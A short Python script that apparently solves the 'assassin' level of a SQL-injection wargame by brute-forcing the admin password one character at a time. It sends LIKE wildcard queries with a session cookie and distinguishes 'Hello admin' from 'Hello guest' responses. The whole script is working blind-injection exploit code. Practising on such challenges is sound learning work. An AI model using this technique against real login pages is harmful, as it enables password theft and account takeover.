import requests

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookie = {"PHPSESSID" : 'ovbfdu14h0vaeamskdlr10nttu'}

result_pw = ''

cash = ''
cash_1 = ''
for i in range(8):
    if not cash_1:
        result_pw += cash
        cash = ''
        cash_1 = ''
    for pw in range(ord('0'), ord('z')):
        param = {'pw': f'{result_pw+chr(pw)}%'}
        res = requests.get(url,params=param, cookies=cookie)
        if not "<hr><br><code>" in res.text:
            if "Hello admin" in res.text: # Hello admin | Hello guest를 바꿔가며 pw를 알아낼 수 있음
                if chr(pw) != '_':
                    cash = chr(pw)
            else:
                cash_1 = chr(pw)
                result_pw += chr(pw)
                break
    print(f'{i+1} : {result_pw}')

print(result_pw.lower())